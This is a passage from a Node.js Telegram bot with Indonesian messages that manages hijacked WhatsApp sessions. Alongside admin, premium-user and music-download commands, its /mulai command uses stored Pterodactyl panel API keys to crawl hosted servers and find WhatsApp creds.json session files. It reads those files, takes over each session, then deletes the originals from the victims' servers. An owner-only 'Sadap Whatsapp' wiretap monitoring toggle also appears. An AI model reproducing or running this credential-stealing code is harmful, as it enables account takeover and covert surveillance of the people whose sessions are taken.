      "❌ Hanya owner yang bisa mengubah pengaturan ini.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      `ℹ️ Status GroupOnly: *${groupOnly ? "✅ ON" : "❌ OFF"}*\nGunakan:\n/grouponly on\n/grouponly off`,
      { parse_mode: "Markdown" }
    );
  }

  const mode = match[1].toLowerCase();
  if (mode === "on") {
    groupOnly = true;
    bot.sendMessage(chatId, "✅ Mode *GroupOnly* telah diaktifkan.", {
      parse_mode: "Markdown",
    });
  } else if (mode === "off") {
    groupOnly = false;
    bot.sendMessage(chatId, "❌ Mode *GroupOnly* telah dimatikan.", {
      parse_mode: "Markdown",
    });
  } else {
    bot.sendMessage(chatId, "⚠️ Gunakan dengan benar:\n/grouponly on | off", {
      parse_mode: "Markdown",
    });
  }
});


//=======case owner=======//
bot.onText(/\/deladmin(?:\s+(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Hanya owner yang bisa hapus admin
  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  // Cek input
  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input.\nGunakan contoh: `/deladmin 123456789`",
      { parse_mode: "Markdown" }
    );
  }

  const userId = match[1].trim();

  // Validasi angka
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input.\nContoh yang benar: `/deladmin 6843967527`",
      { parse_mode: "Markdown" }
    );
  }

  const uid = Number(userId);

  // Cari dan hapus user dari daftar admin
  const adminIndex = adminUsers.indexOf(uid);
  if (adminIndex !== -1) {
    adminUsers.splice(adminIndex, 1);
    saveAdminUsers(); // pastikan fungsi ini ada
    console.log(`${senderId} removed ${uid} from admin list`);
    bot.sendMessage(chatId, `✅ User \`${uid}\` berhasil dihapus dari daftar admin.`, {
      parse_mode: "Markdown",
    });
  } else {
    bot.sendMessage(chatId, `❌ User \`${uid}\` tidak ada di daftar admin.`, {
      parse_mode: "Markdown",
    });
  }
});

bot.onText(/\/addadmin(?:\s+(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Hanya owner yang bisa add admin
  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  // Cek input
  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input.\nGunakan contoh: `/addadmin 123456789`",
      { parse_mode: "Markdown" }
    );
  }

  const userId = match[1].trim();

  // Validasi angka
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input.\nContoh yang benar: `/addadmin 6843967527`",
      { parse_mode: "Markdown" }
    );
  }

  const uid = Number(userId);

  // Tambahkan ke adminUsers jika belum ada
  if (!adminUsers.includes(uid)) {
    adminUsers.push(uid);
    saveAdminUsers(); // pastikan fungsi ini sudah ada
    console.log(`${senderId} added ${uid} to admin list`);
    bot.sendMessage(chatId, `✅ User \`${uid}\` berhasil ditambahkan sebagai admin.`, {
      parse_mode: "Markdown",
    });
  } else {
    bot.sendMessage(chatId, `❌ User \`${uid}\` sudah menjadi admin.`, {
      parse_mode: "Markdown",
    });
  }
});

// =============== Command Add Session (Public) ===============
bot.onText(/^\/add(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];

  // Validasi input
  if (!input) {
    return bot.sendMessage(
      chatId,
      "❌ Format salah!\n\nGunakan:\n<code>/add {json}</code>",
      { parse_mode: "HTML" }
    );
  }

  let sessionData;
  try {
    sessionData = JSON.parse(input);
  } catch (err) {
    return bot.sendMessage(
      chatId,
      "❌ JSON tidak valid. Coba ulangi dengan benar.",
      { parse_mode: "HTML" }
    );
  }

  try {
    const rawId = sessionData?.me?.id;
    if (!rawId) {
      return bot.sendMessage(
        chatId,
        "❌ Session data tidak memiliki ID valid.",
        { parse_mode: "HTML" }
      );
    }

    const cleanId = rawId.split(":")[0];
    const number = cleanId.split("@")[0];

    // Simpan sesi aktif
    saveActiveSessions(number);

    // Buat folder session
    const devicePath = createSessionDir(number);
    const filePath = path.join(devicePath, "creds.json");

    // Simpan file creds.json
    fs.writeFileSync(filePath, JSON.stringify(sessionData, null, 2));

    // Load multi-file auth state
    await useMultiFileAuthState(devicePath);

    // Hubungkan ke WhatsApp
    await connectToWhatsApp(number, chatId);

    // Beri konfirmasi
    return bot.sendMessage(
      chatId,
      `<blockquote><b>✅ Session berhasil dibuat:</b> <code>${number}</code></blockquote>\n<pre>🚀 Tunggu beberapa saat...</pre>`,
      { parse_mode: "HTML" }
    );
  } catch (err) {
    console.error("❌ Gagal menyimpan session:", err.message);
    return bot.sendMessage(
      chatId,
      `❌ Gagal menyimpan session device <code>${number || "Unknown"}</code>`,
      { parse_mode: "HTML" }
    );
  }
});

bot.onText(/\/listpair/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  try {
    // Cek akses
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(
        chatId,
        "❌ Kamu tidak punya akses untuk melihat daftar premium bot."
      );
    }

    let index = 1;
    let result = "```\n📋 DAFTAR SENDER AKTIF:\n\n";

    for (const [botNumber, sock] of sessions.entries()) {
      const status = sock.user ? "🟢 𝗔𝗰𝘁𝗶𝘃𝗲" : "🔴 𝗢𝗳𝗳𝗹𝗶𝗻𝗲";

      result += `𝐒𝐄𝐍𝐃𝐄𝐑 ${index}\n`;
      result += `📱 ɴᴏᴍᴏʀ : ${botNumber}\n`;
      result += `🚀 ꜱᴛᴀᴛᴜꜱ : ${status}\n`;
      result += `━━━━━━━━━━━━━━━━━━\n\n`;

      index++;
    }

    result += `📊 ᴛᴏᴛᴀʟ ꜱᴇɴᴅᴇʀ ᴀᴄᴛɪꜰ : ${sessions.size}\n\`\`\``;

    await bot.sendMessage(chatId, result, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error in listpair:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat mengambil daftar bot.\nSilakan coba lagi."
    );
  }
});

bot.onText(/\/addpair (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error(`bot ${botNum}:`, error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

const moment = require("moment");

bot.onText(/\/setcd (\d+[smh])/, (msg, match) => {
  const chatId = msg.chat.id;
  const response = setCooldown(match[1]);

  bot.sendMessage(chatId, response);
});

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d."
    );
  }

  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d."
    );
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d."
    );
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d."
    );
  }

  const now = moment();
  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d"
      ? "days"
      : duration.slice(-1) === "h"
      ? "hours"
      : "minutes"
  );

  if (!premiumUsers.find((user) => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(
      `${senderId} added ${userId} to premium until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}`
    );
    bot.sendMessage(
      chatId,
      `✅ User ${userId} has been added to the premium list until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  } else {
    const existingUser = premiumUsers.find((user) => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
    savePremiumUsers();
    bot.sendMessage(
      chatId,
      `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});


bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - P R E M \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format("YYYY-MM-DD HH:mm:ss");
    message += `${index + 1}. ID: \`${
      user.id
    }\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/cekidch (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const link = match[1];

  let result = await getWhatsAppChannelInfo(link);

  if (result.error) {
    bot.sendMessage(chatId, `⚠️ ${result.error}`);
  } else {
    let teks = `
📢 *Informasi Channel WhatsApp*
🔹 *ID:* ${result.id}
🔹 *Nama:* ${result.name}
🔹 *Total Pengikut:* ${result.subscribers}
🔹 *Status:* ${result.status}
🔹 *Verified:* ${result.verified}
        `;
    bot.sendMessage(chatId, teks);
  }
});
 
bot.onText(/\/delbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  let statusMessage = await bot.sendMessage(
    chatId,
`
\`\`\`╭─────────────────
│    𝙼𝙴𝙽𝙶𝙷𝙰𝙿𝚄𝚂 𝙱𝙾𝚃    
│────────────────
│ Bot: ${botNumber}
│ Status: Memproses...
╰─────────────────\`\`\`
`,
    { parse_mode: "Markdown" }
  );

try {
    const sock = sessions.get(botNumber);
    if (sock) {
      sock.logout();
      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

if (fs.existsSync(SESSIONS_FILE)) {
        const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        const updatedNumbers = activeNumbers.filter((num) => num !== botNumber);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
      }

      await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    } else {
      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });

        if (fs.existsSync(SESSIONS_FILE)) {
          const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
                                const updatedNumbers = activeNumbers.filter(
            (num) => num !== botNumber
          );
          fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
        }

        await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      } else {
        await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁    
│────────────────
│ Bot: ${botNumber}
│ Status: Bot tidak ditemukan!
╰─────────────────\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      }
    }
} catch (error) {
    console.error("Error deleting bot:", error);
    await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁  
│────────────────
│ Bot: ${botNumber}
│ Status: ${error.message}
╰─────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});
if (typeof okBox === 'undefined') global.okBox = a=>"```"+" Ok\n"+a.join("\n")+"```"
if (typeof errBox === 'undefined') global.errBox = a=>"```"+" Eror\n"+a.join("\n")+"```"

const AX = axios.create({
  timeout: 20000,
  validateStatus: s => s >= 200 && s < 500,
  httpAgent: new httpMod.Agent({ keepAlive: true }),
  httpsAgent: new httpsMod.Agent({ keepAlive: true })
})

const ADP_DIR  = path.join(__dirname, 'adp')
fs.mkdirpSync(ADP_DIR)
const ADP_FILE = path.join(ADP_DIR, 'adp.json')

function loadADP(){ try{ return JSON.parse(fs.readFileSync(ADP_FILE,'utf8')) }catch{ return {} } }
function saveADP(o){ fs.writeFileSync(ADP_FILE, JSON.stringify(o,null,2)) }
function isPtlc(t){ return typeof t==='string' && /^ptlc_/i.test(t) }
function isPtla(t){ return typeof t==='string' && /^ptla_/i.test(t) }
function asText(x){ return typeof x==='string' ? x : JSON.stringify(x) }
function baseUrl(d){ let u=String(d||'').trim(); if(!/^https?:\/\//i.test(u)) u='https://'+u; return u.replace(/\/+$/,'') }

async function httpGet(url, token){ return AX.get(url, { headers:{ Authorization:`Bearer ${token}` } }) }
async function httpPost(url, token, data){ return AX.post(url, data, { headers:{ Authorization:`Bearer ${token}`, 'Content-Type':'application/json' } }) }

async function fetchAllPages(url, token) {
let page = 1
  let results = []
  while (true) {
    try {
      const r = await httpGet(`${url}?page=${page}&per_page=50`, token)
      if (r.status !== 200) break
      const data = r.data?.data || []
      if (!data.length) break
      results.push(...data)
      if (!r.data.meta || !r.data.meta.pagination || !r.data.meta.pagination.links?.next) break
            page++
    } catch {
      break
    }
  }
  return results
}

async function listServersClient(b, ptlc){
  const a = await fetchAllPages(`${b}/api/client/servers`, ptlc)
  return a.map(x=>({ id:x.attributes.identifier, name:x.attributes.name||x.attributes.identifier }))
}

async function listServersApplication(b, ptla){
  const a = await fetchAllPages(`${b}/api/application/servers`, ptla)
  return a.map(x=>{
    const at = x.attributes || {}
    return { id:at.identifier||at.uuidShort||at.uuid, name:at.name||at.identifier||at.uuidShort }
  }).filter(x=>x.id)
}

async function listServersWithFallback(b, ptlc, ptla){
  if (isPtlc(ptlc)) { try{ const s=await listServersClient(b, ptlc); if(s.length) return s }catch{} }
  if (isPtla(ptla)) { try{ const s=await listServersApplication(b, ptla); if(s.length) return s }catch{} }
  return []
}

const QUICK_PATHS = [
  '/session/creds.json',
  '/home/container/session/creds.json',
  '/home/container/creds.json',
  '/container/creds.json',
  '/creds.json',
  'creds.json'
]

async function listDirAny(base, ptlc, ptla, sid, dir){
  if (isPtlc(ptlc)) {
    try{
      const r=await httpGet(`${base}/api/client/servers/${sid}/files/list?directory=${encodeURIComponent(dir)}`, ptlc)
      if(r.status===200) return (r.data?.data||[]).map(x=>x.attributes||x)
    }catch{}
  }
  if (isPtla(ptla)) {
      try{
      const r=await httpGet(`${base}/api/client/servers/${sid}/files/list?directory=${encodeURIComponent(dir)}`, ptla)
      if(r.status===200) return (r.data?.data||[]).map(x=>x.attributes||x)
    }catch{}
  }
  return []
}

async function readFileAny(base, ptla, ptlc, sid, filePath){
  if (isPtla(ptla)) {
    try{
      const r=await httpGet(`${base}/api/client/servers/${sid}/files/contents?file=${encodeURIComponent(filePath)}`, ptla)
      if(r.status===200) return asText(r.data)
    }catch{}
  }
  if (isPtlc(ptlc)) {
    try{
      const r=await httpGet(`${base}/api/client/servers/${sid}/files/contents?file=${encodeURIComponent(filePath)}`, ptlc)
            if(r.status===200) return asText(r.data)
    }catch{}
  }
  throw new Error('gagal_baca_file')
}

async function deleteFileAny(base, ptla, ptlc, sid, filePath){
  const body = { root:"/", files:[ String(filePath).replace(/^\/+/,'') ] }
  if (isPtlc(ptlc)) { try{ const r=await httpPost(`${base}/api/client/servers/${sid}/files/delete`, ptlc, body); if(r.status===204||r.status===200) return }catch{} }
  if (isPtla(ptla)) { try{ const r=await httpPost(`${base}/api/client/servers/${sid}/files/delete`, ptla, body); if(r.status===204||r.status===200) return }catch{} }
  throw new Error('gagal_hapus_file')
}

async function discoverCredsPaths(base, ptlc, ptla, sid, maxDepth = 3, maxDirs = 150){
  for (const qp of QUICK_PATHS){ try{ await readFileAny(base, ptla, ptlc, sid, qp); return [qp] }catch{} }
  const roots = ['/', '/home', '/home/container', '/container', '/root', '/home/container/session', '/home/container/bot', '/home/container/data']
  const q = [...new Set(roots)]
  const seen = new Set(q)
  let depth = 0, expanded = 0
  while (q.length && depth < maxDepth && expanded < maxDirs){
    const size = q.length
    for (let i=0; i<size && expanded < maxDirs; i++){
               const dir = q.shift()
      expanded++
      let items=[]
      try{ items = await listDirAny(base, ptlc, ptla, sid, dir) }catch{}
      for (const it of items){
        const name = String(it.name || '')
        const isDir = (it.is_file===false)||(it.type==='directory')||(it.directory===true)||(it.is_directory===true)
        if (!isDir){
          if 
(name.toLowerCase()==='creds.json'){
            const p = `${(it.directory||dir).replace(/\/+$/,'')}/${name}`
            return [p]
          }
          continue
        }
        if (name==='.'||name==='..') continue
        const child = `${(it.directory||dir).replace(/\/+$/,'')}/${name}`
        if (!seen.has(child)){ seen.add(child); q.push(child) }
      }
    }
    depth++
  }
  return QUICK_PATHS.slice(0,2)
}

async function writeAndPairFromRaw(raw, chatId){
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sess-'))
  try{
    await fs.writeFile(path.join(tmp,'creds.json'), raw)
    const creds = await fs.readJson(path.join(tmp,'creds.json'))
    const me = creds?.me?.id || ''
    if (!me) throw new Error('creds_invalid')
    const n = String(me).split(':')[0]
    const dest = createSessionDir(n)
    await fs.remove(dest)
    await fs.copy(tmp, dest)
    if (typeof saveActiveSessions==='function') saveActiveSessions(n)
    if (typeof connectToWhatsApp==='function') await connectToWhatsApp(n, chatId)
    return n
  } finally { await fs.remove(tmp).catch(()=>{}) }
}

function pLimit(n){
  let a=0, q=[]
  const next=()=>{ if(q.length && a<n){ a++; const {fn,rs,rj}=q.shift(); fn().then(v=>{a--;rs(v);next()}).catch(e=>{a--;rj(e);next()}) } }
  return fn=>new Promise((rs,rj)=>{ q.push({fn,rs,rj}); next() })
}

bot.onText(/^\/cadp\s+(\S+)\s+(\S+)$/i, async (msg, m) => {
  const chatId = msg.chat.id
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
const key = m[1]
  const parts = m[2].split(",").map(s => s.trim())
  if (parts.length < 3) return bot.sendMessage(chatId, errBox(["Format: /cadp angka list <ptla,ptlc,domain>"]), { parse_mode: "Markdown" })
  const [ptla, ptlc, domain] = parts
  const data = loadADP(); data[key] = { ptla, ptlc, domain }; saveADP(data)
  await bot.sendMessage(chatId, okBox([`ADP '${key}' disimpan`]), { parse_mode: "Markdown" })
})

bot.onText(/^\/listadp$/i, async msg => {
  const chatId = msg.chat.id
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const data = loadADP()
  const mask = v => String(v || "").slice(0, 10) + (String(v || "").length > 10 ? "…" : "")
  const lines = Object.entries(data).map(([k, v]) => `${k} → ${v.domain || "-"} • ${mask(v.ptla)} • ${mask(v.ptlc)}`)
  await bot.sendMessage(chatId, lines.length ? okBox(lines) : errBox(["(kosong)"]), { parse_mode: "Markdown" })
})

bot.onText(/^\/deladp\s+(\S+)$/i, async (msg, m) => {
  const chatId = msg.chat.id
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const key = m[1]
  const data = loadADP()
  if (!data[key]) return bot.sendMessage(chatId, errBox([`Alias '${key}' tidak ada`]), { parse_mode: "Markdown" })
  delete data[key]; saveADP(data)
  await bot.sendMessage(chatId, okBox([`ADP '${key}' dihapus`]), { parse_mode: "Markdown" })
})

bot.onText(/^\/mulai\s+(\S+)$/i, async (msg, m) => {
  const chatId = msg.chat.id
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const key = m[1]
  const cfg = loadADP()[key]
  if (!cfg) return bot.sendMessage(chatId, errBox([`ADP '${key}' tidak ditemukan`]), { parse_mode: "Markdown" })
  const b = baseUrl(cfg.domain)
  
   let servers = []
  try {
    servers = await listServersWithFallback(b, cfg.ptlc, cfg.ptla)
    if (!servers.length) return bot.sendMessage(chatId, errBox([`Tidak ada server pada ${b}`]), { parse_mode: "Markdown" })
  } catch (e) {
    const msgErr = e?.response ? `${e.response.status} ${e.response.statusText || ""}`.trim() : (e.message || "gagal")
    return bot.sendMessage(chatId, errBox([`Gagal koneksi: ${msgErr}`]), { parse_mode: "Markdown" })
  }
    
   let ok = 0, fail = 0
  const perServerErrors = []
  const limit = pLimit(6)

  await bot.sendMessage(chatId, ` Proses Pengambilan Sender Session Di Adp sedang berjalan...`)

await Promise.all(servers.map(s => limit(async () => {
    let paired = false
    try {
      const paths = await discoverCredsPaths(b, cfg.ptlc, cfg.ptla, s.id)
      for (const p of paths) {
        try {
          const raw = await readFileAny(b, cfg.ptla, cfg.ptlc, s.id, p)
          const botId = await writeAndPairFromRaw(raw, chatId)
          try { await deleteFileAny(b, cfg.ptla, cfg.ptlc, s.id, p) } catch {}
          ok++; paired = true; break
        } catch {}
      }
      if (!paired) throw new Error("creds_not_found")
    } catch (e) {
      fail++; perServerErrors.push(`✖ ${e.message || "gagal"}`)
    }
  })))
    
const lines = [` \n✔ ${ok} • ✖ ${fail}`]
  if (perServerErrors.length) lines.push(...perServerErrors)
  await bot.sendMessage(chatId, okBox(lines), { parse_mode: "Markdown" })
})
  
// Command /play
bot.onText(/^\/play(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  let query = (match[1] || "").trim();

  if (!query) {
    return bot.sendMessage(
      chatId,
      "⚠️ Gunakan format:\n/play judul lagu\n/play judul lagu -v (untuk video)",
      { reply_to_message_id: msg.message_id }
    );
  }

  // Deteksi mode video
  const isVideo = query.endsWith("-v");
  if (isVideo) query = query.replace(/-v$/, "").trim();

  let progressMsg;
  try {
    // Progress awal
    progressMsg = await bot.sendMessage(chatId, "🔎 Mencari video...", {
      reply_to_message_id: msg.message_id,
    });

    // Pencarian YouTube
    const searchRes = await axios.get(
      `https://api.siputzx.my.id/api/s/youtube?query=${encodeURIComponent(query)}`
    );
    const results = searchRes.data?.data;

    if (!results || !results.length) {
      await bot.editMessageText("❌ Tidak ada hasil ditemukan.", {
        chat_id: chatId,
        message_id: progressMsg.message_id,
      });
      return;
    }

    const video = results[0];

    // Update progress
    await bot.editMessageText(
      isVideo ? "⏳ Mengunduh video..." : "⏳ Mengunduh audio...",
      {
        chat_id: chatId,
        message_id: progressMsg.message_id,
      }
    );

    // API download
    const apiUrl = isVideo
      ? `https://restapi-v2.simplebot.my.id/download/ytmp4?url=${encodeURIComponent(video.url)}`
      : `https://restapi-v2.simplebot.my.id/download/ytmp3?url=${encodeURIComponent(video.url)}`;

    const mediaRes = await axios.get(apiUrl);
    const mediaUrl = mediaRes.data?.result;

    if (!mediaUrl) {
      await bot.editMessageText("❌ Gagal mengambil media.", {
        chat_id: chatId,
        message_id: progressMsg.message_id,
      });
      return;
    }

    // Caption info (pakai HTML aman, tanpa <blockquote>)
    const caption = `
<b>🎵 ${video.title}</b>
👤 ${video.author?.name || "Unknown"}
⏱️ ${video.duration?.timestamp || "-"}
👁️ ${video.views} views
📅 ${video.ago}
`;

    // Sanitasi nama file
    const safeTitle = video.title.replace(/[<>:"/\\|?*]+/g, "");
    const ext = isVideo ? "mp4" : "mp3";
    const tmpFile = path.join(__dirname, `${Date.now()}-${safeTitle}.${ext}`);

    // Download file sementara
    const response = await axios({
      method: "get",
      url: mediaUrl,
      responseType: "stream",
    });

    await new Promise((resolve, reject) => {
      const stream = response.data.pipe(fs.createWriteStream(tmpFile));
      stream.on("finish", resolve);
      stream.on("error", reject);
    });

    // Kirim ke Telegram
    if (isVideo) {
      await bot.sendVideo(chatId, tmpFile, {
        caption,
        parse_mode: "HTML",
        reply_to_message_id: msg.message_id,
      });
    } else {
      await bot.sendAudio(chatId, tmpFile, {
        title: video.title,
        performer: video.author?.name || "Unknown",
        caption,
        parse_mode: "HTML",
        reply_to_message_id: msg.message_id,
      });
    }

    // Hapus file sementara + pesan progress
    fs.unlinkSync(tmpFile);
    bot.deleteMessage(chatId, progressMsg.message_id).catch(() => {});
  } catch (err) {
    console.error(err.response?.data || err.message);

    if (progressMsg) {
      await bot
        .editMessageText("❌ Terjadi kesalahan, coba lagi nanti.", {
          chat_id: chatId,
          message_id: progressMsg.message_id,
        })
        .catch(() => {});
      setTimeout(() => {
        bot.deleteMessage(chatId, progressMsg.message_id).catch(() => {});
      }, 5000);
    } else {
      bot.sendMessage(chatId, "❌ Terjadi kesalahan, coba lagi nanti.", {
        reply_to_message_id: msg.message_id,
      });
    }
  }
});

// ============================================================================
// 📡 FITUR: MONITORING, KIRIM PESAN & STORY WHATSAPP (FULL MEDIA SUPPORT 2 ARAH)
// ============================================================================

const mime = require("mime-types");

// 🔧 Ambil config & notifikasi
const { OWNER_ID } = require("./Settings Scarry/config");
const NOTIF_FILE = path.join(__dirname, "./Settings Scarry/notifikasi.json");

if (!fs.existsSync(NOTIF_FILE))
  fs.writeFileSync(NOTIF_FILE, JSON.stringify({ id: "" }, null, 2), "utf8");

const { id: NOTIF_ID } = require(NOTIF_FILE);
let waMonitoring = false;

// ============================================================================
// 🧩 CEK OWNER
// ============================================================================
function isOwner(userId) {
  return OWNER_ID.map(String).includes(String(userId));
}

function ownerOnly(bot, msg) {
  bot.sendMessage(msg.chat.id, "❌ Kamu *tidak memiliki izin*.", { parse_mode: "Markdown" });
}

// ============================================================================
// ⚙️ CONTROL MONITORING
// ============================================================================
bot.onText(/^\/wa_on$/, (msg) => {
  if (!isOwner(msg.from.id)) return ownerOnly(bot, msg);
  waMonitoring = true;
  bot.sendMessage(msg.chat.id, "✅ Sadap Whatsapp *aktif*.", { parse_mode: "Markdown" });
});

bot.onText(/^\/wa_off$/, (msg) => {
  if (!isOwner(msg.from.id)) return ownerOnly(bot, msg);
  waMonitoring = false;
  bot.sendMessage(msg.chat.id, "⛔ Sadap Whatsapp *dimatikan*.", { parse_mode: "Markdown" });
});

bot.onText(/^\/wa_status$/, (msg) => {
  if (!isOwner(msg.from.id)) return ownerOnly(bot, msg);
  bot.sendMessage(
    msg.chat.id,
    `📋 Monitoring: *${waMonitoring ? "ON ✅" : "OFF ❌"}*`,
    { parse_mode: "Markdown" }
  );
});

// ============================================================================
// 🧾 FITUR /LISTGROUP — Lihat daftar grup dari sesi aktif
// ============================================================================
bot.onText(/^\/listgroup (.+)$/, async (msg, match) => {
  if (!isOwner(msg.from.id)) return ownerOnly(bot, msg);
  const sessionNumber = match[1];
  const sock = sessions.get(sessionNumber);

  if (!sock)
    return bot.sendMessage(msg.chat.id, `⚠️ Sesi *${sessionNumber}* tidak ditemukan / belum aktif.`, {
      parse_mode: "Markdown",
    });

  try {
    const groups = await sock.groupFetchAllParticipating();
    let text = `📋 *Daftar Grup Sesi ${sessionNumber}:*\n\n`;
    let count = 0;

    for (const id in groups) {
      const g = groups[id];
